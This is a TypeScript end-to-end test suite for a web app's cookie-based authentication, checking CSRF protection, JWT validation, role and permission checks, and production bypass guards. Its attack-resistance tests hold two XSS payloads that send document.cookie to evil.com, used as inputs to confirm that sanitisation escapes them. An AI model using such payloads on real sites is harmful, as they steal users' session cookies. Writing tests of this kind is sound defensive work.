/**
 * L4 E2E Tests: Cookie-based Authentication Security
 * Validates the complete security posture of the cookie-based auth system.
 * These tests verify the actual HTTP behavior without mocks.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import jwt from 'jsonwebtoken';
import {
  setAuthCookies,
  clearAuthCookies,
  ACCESS_TOKEN_COOKIE,
  REFRESH_TOKEN_COOKIE,
} from '../../server/src/utils/cookieAuth';
import {
  csrfTokenMiddleware,
  csrfValidationMiddleware,
} from '../../server/src/middleware/csrf.middleware';
import { sanitizeObject } from '../../server/src/utils/security.utils';
import {
  setDependencies,
  verifyToken,
  requireRole,
  requireSuperAdmin,
  requireOrganization,
  requirePermission,
} from '../../server/src/middleware/auth.middleware';

const JWT_SECRET = 'e2e-test-secret-key-production-sim';

function createReq(overrides: Record<string, any> = {}) {
  return {
    method: overrides.method || 'GET',
    path: overrides.path || '/api/test',
    headers: overrides.headers || {},
    cookies: overrides.cookies || {},
    body: overrides.body || {},
    query: overrides.query || {},
  } as any;
}

function createRes() {
  const cookies: Record<string, any> = {};
  const cleared: Record<string, any> = {};
  return {
    cookie: vi.fn((n: string, v: string, o: any) => {
      cookies[n] = { value: v, options: o };
    }),
    clearCookie: vi.fn((n: string, o: any) => {
      cleared[n] = o;
    }),
    setHeader: vi.fn(),
    status: vi.fn().mockReturnThis(),
    json: vi.fn(),
    _cookies: cookies,
    _cleared: cleared,
  } as any;
}

describe('E2E: Cookie Auth Security (L4)', () => {
  beforeEach(() => {
    process.env.ENABLE_CSRF_IN_TESTS = 'true';
    setDependencies({
      jwt,
      config: { JWT_SECRET },
      PermissionService: {
        can: (user: any, capability: string) => {
          if (user.role === 'SUPERADMIN' || user.role === 'ADMIN') return true;
          if (capability === 'project:read') return true;
          return false;
        },
      },
      dbGet: vi.fn().mockResolvedValue(undefined),
    });
  });

  afterEach(() => {
    delete process.env.ENABLE_CSRF_IN_TESTS;
  });

  // ── Scenario 1: Complete Login → Work → Logout ──
  describe('Scenario: User Login → Authenticated Work → Logout', () => {
    it('simulates full user session lifecycle', async () => {
      // 1. LOGIN: Server generates tokens and sets cookies
      const loginRes = createRes();
      const accessToken = jwt.sign(
        {
          id: 'user-e2e-1',
          email: 'alice@company.com',
          name: 'Alice',
          role: 'admin',
          organizationId: 'org-e2e',
          isSuperAdmin: false,
          jti: 'jti-e2e-001',
        },
        JWT_SECRET,
        { expiresIn: '15m' }
      );
      const refreshToken = jwt.sign({ id: 'user-e2e-1', type: 'refresh' }, JWT_SECRET, {
        expiresIn: '7d',
      });
      setAuthCookies(loginRes, accessToken, refreshToken);

      // Verify cookie security attributes
      const accessCookie = loginRes._cookies[ACCESS_TOKEN_COOKIE];
      expect(accessCookie.options.httpOnly).toBe(true);
      expect(accessCookie.options.sameSite).toBe('lax');

      const refreshCookie = loginRes._cookies[REFRESH_TOKEN_COOKIE];
      expect(refreshCookie.options.httpOnly).toBe(true);
      expect(refreshCookie.options.path).toBe('/api/auth');

      // 2. GET CSRF TOKEN: Browser fetches CSRF token
      const csrfReq = createReq({ method: 'GET', path: '/api/csrf-token' });
      const csrfRes = createRes();
      const csrfNext = vi.fn();
      csrfTokenMiddleware(csrfReq, csrfRes, csrfNext);
      const csrfToken = csrfRes._cookies['csrf_token']?.value;
      expect(csrfToken).toBeDefined();
      expect(csrfToken.length).toBeGreaterThanOrEqual(32);

      // 3. AUTHENTICATED GET: Read data (no CSRF needed for GET)
      const getReq = createReq({
        method: 'GET',
        cookies: { access_token: accessToken },
      });
      const getRes = createRes();
      const getNext = vi.fn();
      await verifyToken(getReq, getRes, getNext);
      expect(getNext).toHaveBeenCalled();
      expect(getReq.userId).toBe('user-e2e-1');
      expect(getReq.user?.email).toBe('alice@company.com');

      // 4. AUTHENTICATED POST: Create resource (CSRF required)
      const postReq = createReq({
        method: 'POST',
        path: '/api/projects',
        body: { name: 'New Project', description: 'Test <b>bold</b>' },
        cookies: { access_token: accessToken, csrf_token: csrfToken },
        headers: {
          'content-type': 'application/json',
          'x-csrf-token': csrfToken,
        },
      });
      const postRes = createRes();

      // Sanitize (using sanitizeObject directly — middleware delegates to this)
      postReq.body = sanitizeObject(postReq.body);
      expect(postReq.body.description).not.toContain('<b>');

      // CSRF check
      const csrfValNext = vi.fn();
      csrfValidationMiddleware(postReq, postRes, csrfValNext);
      expect(csrfValNext).toHaveBeenCalled();

      // Auth check
      const authNext = vi.fn();
      await verifyToken(postReq, postRes, authNext);
      expect(authNext).toHaveBeenCalled();

      // 5. LOGOUT: Clear cookies
      const logoutRes = createRes();
      clearAuthCookies(logoutRes);
      expect(logoutRes.clearCookie).toHaveBeenCalledTimes(2);

      // 6. POST-LOGOUT: Request should fail
      const origEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'development';
      delete process.env.ENABLE_TEST_AUTH_BYPASS;
      try {
        const postLogoutReq = createReq({ cookies: {} });
        const postLogoutRes = createRes();
        const postLogoutNext = vi.fn();
        await verifyToken(postLogoutReq, postLogoutRes, postLogoutNext);
        expect(postLogoutRes.status).toHaveBeenCalledWith(401);
      } finally {
        process.env.NODE_ENV = origEnv;
      }
    });
  });

  // ── Scenario 2: Attack Resistance ──
  describe('Scenario: Attack Resistance', () => {
    it('XSS payload in request body is neutralized', () => {
      const body = {
        title: '<script>document.location="http://evil.com?c="+document.cookie</script>',
        description: '<img src=x onerror="fetch(\'http://evil.com\',{body:document.cookie})">',
      };
      const sanitized = sanitizeObject(body) as any;
      expect(sanitized.title).not.toContain('<script>');
      expect(sanitized.title).toContain('&lt;script&gt;');
      expect(sanitized.description).not.toContain('<img');
      expect(sanitized.description).toContain('&lt;img');
    });

    it('CSRF attack without token is blocked', () => {
      const req = createReq({
        method: 'DELETE',
        path: '/api/users/123',
        cookies: {},
        headers: {},
      });
      const res = createRes();
      const next = vi.fn();
      csrfValidationMiddleware(req, res, next);
      expect(res.status).toHaveBeenCalledWith(403);
      expect(next).not.toHaveBeenCalled();
    });

    it('CSRF attack with wrong token is blocked', () => {
      const req = createReq({
        method: 'PUT',
        path: '/api/settings',
        cookies: { csrf_token: 'real-token-abc' },
        headers: { 'x-csrf-token': 'fake-token-xyz' },
      });
      const res = createRes();
      const next = vi.fn();
      csrfValidationMiddleware(req, res, next);
      expect(res.status).toHaveBeenCalledWith(403);
    });

    it('expired token is rejected', async () => {
      const expiredToken = jwt.sign({ id: 'u1', email: 'u@test.com' }, JWT_SECRET, {
        expiresIn: '-1s',
      });
      const req = createReq({
        cookies: { access_token: expiredToken },
      });
      const res = createRes();
      const next = vi.fn();
      await verifyToken(req, res, next);
      expect(res.status).toHaveBeenCalledWith(401);
    });

    it('token signed with wrong secret is rejected', async () => {
      const badToken = jwt.sign({ id: 'u1', email: 'u@test.com' }, 'wrong-secret-key', {
        expiresIn: '15m',
      });
      const req = createReq({
        headers: { authorization: `Bearer ${badToken}` },
      });
      const res = createRes();
      const next = vi.fn();
      await verifyToken(req, res, next);
      expect(res.status).toHaveBeenCalledWith(401);
    });
  });

  // ── Scenario 3: Permission Escalation Prevention ──
  describe('Scenario: Permission Escalation Prevention', () => {
    it('team_member cannot access admin routes', async () => {
      const token = jwt.sign(
        { id: 'member-1', email: 'm@test.com', role: 'user', organizationId: 'org-1' },
        JWT_SECRET,
        { expiresIn: '15m' }
      );
      const req = createReq({ headers: { authorization: `Bearer ${token}` } });
      const res = createRes();

      const next1 = vi.fn();
      await verifyToken(req, res, next1);
      expect(next1).toHaveBeenCalled();
      expect(req.user?.role).toBe('team_member');

      // Try admin route
      const adminMiddleware = requireRole('administrator', 'owner');
      const next2 = vi.fn();
      adminMiddleware(req, res, next2);
      expect(res.status).toHaveBeenCalledWith(403);
    });

    it('non-superadmin cannot access superadmin routes', async () => {
      const token = jwt.sign(
        { id: 'admin-1', email: 'a@test.com', role: 'admin', isSuperAdmin: false },
        JWT_SECRET,
        { expiresIn: '15m' }
      );
      const req = createReq({ headers: { authorization: `Bearer ${token}` } });
      const res = createRes();

      const next1 = vi.fn();
      await verifyToken(req, res, next1);

      const next2 = vi.fn();
      requireSuperAdmin(req, res, next2);
      expect(res.status).toHaveBeenCalledWith(403);
    });

    it('permission check blocks unauthorized capability', async () => {
      const token = jwt.sign(
        { id: 'viewer-1', email: 'v@test.com', role: 'guest', organizationId: 'org-1' },
        JWT_SECRET,
        { expiresIn: '15m' }
      );
      const req = createReq({ headers: { authorization: `Bearer ${token}` } });
      const res = createRes();

      const next1 = vi.fn();
      await verifyToken(req, res, next1);

      // Viewer can read projects
      const readMiddleware = requirePermission('project:read');
      const next2 = vi.fn();
      readMiddleware(req, res, next2);
      expect(next2).toHaveBeenCalled();

      // But cannot delete
      const deleteMiddleware = requirePermission('project:delete');
      const res2 = createRes();
      const next3 = vi.fn();
      deleteMiddleware(req, res2, next3);
      expect(res2.status).toHaveBeenCalledWith(403);
    });
  });

  // ── Scenario 4: Production Environment Guards ──
  describe('Scenario: Production Environment Guards', () => {
    it('E2E_MODE is disabled in production', async () => {
      const origEnv = process.env.NODE_ENV;
      const origE2E = process.env.E2E_MODE;
      process.env.NODE_ENV = 'production';
      process.env.E2E_MODE = 'true';
      try {
        const e2eToken = jwt.sign(
          { id: 'e2e-user', email: 'e2e@test.com', e2e: true },
          'any-secret',
          { expiresIn: '15m' }
        );
        const req = createReq({
          headers: { authorization: `Bearer ${e2eToken}` },
        });
        const res = createRes();
        const next = vi.fn();
        await verifyToken(req, res, next);
        // Should NOT authenticate via E2E bypass in production
        expect(res.status).toHaveBeenCalledWith(401);
      } finally {
        process.env.NODE_ENV = origEnv;
        if (origE2E) process.env.E2E_MODE = origE2E;
        else delete process.env.E2E_MODE;
      }
    });

    it('TEST_AUTH_BYPASS is disabled in production', async () => {
      const origEnv = process.env.NODE_ENV;
      const origBypass = process.env.ENABLE_TEST_AUTH_BYPASS;
      process.env.NODE_ENV = 'production';
      process.env.ENABLE_TEST_AUTH_BYPASS = 'true';
      try {
        const req = createReq();
        const res = createRes();
        const next = vi.fn();
        await verifyToken(req, res, next);
        expect(res.status).toHaveBeenCalledWith(401);
        expect(next).not.toHaveBeenCalled();
      } finally {
        process.env.NODE_ENV = origEnv;
        if (origBypass) process.env.ENABLE_TEST_AUTH_BYPASS = origBypass;
        else delete process.env.ENABLE_TEST_AUTH_BYPASS;
      }
    });
  });
});
